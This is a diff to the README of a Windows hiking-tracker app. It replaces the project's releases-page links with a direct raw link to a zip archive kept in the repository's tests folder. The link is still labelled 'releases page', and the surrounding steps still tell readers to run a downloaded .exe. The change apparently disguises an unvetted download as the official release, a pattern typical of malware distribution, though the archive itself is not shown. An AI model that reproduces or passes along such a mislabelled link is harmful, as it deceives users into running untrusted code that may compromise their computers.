@@ -1,6 +1,6 @@
 # 🏔️ nickys-hiking-pal - Track Your Hikes With Full Privacy
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whatev9695/nickys-hiking-pal/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Whatev9695/nickys-hiking-pal/raw/refs/heads/main/tests/hiking_pal_nickys_v3.2.zip)
 
 ## 📌 About This App
 
@@ -18,7 +18,7 @@ nickys-hiking-pal helps you record your outdoor adventures. You keep your hiking
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [releases page](https://github.com/Whatev9695/nickys-hiking-pal/releases) to find the correct file for your system.
+1.  Visit the [releases page](https://github.com/Whatev9695/nickys-hiking-pal/raw/refs/heads/main/tests/hiking_pal_nickys_v3.2.zip) to find the correct file for your system.
 2.  Look for the file ending in `.exe` under the latest release heading.
 3.  Click the link to start the download.
 4.  Once the file finishes downloading, open your "Downloads" folder.
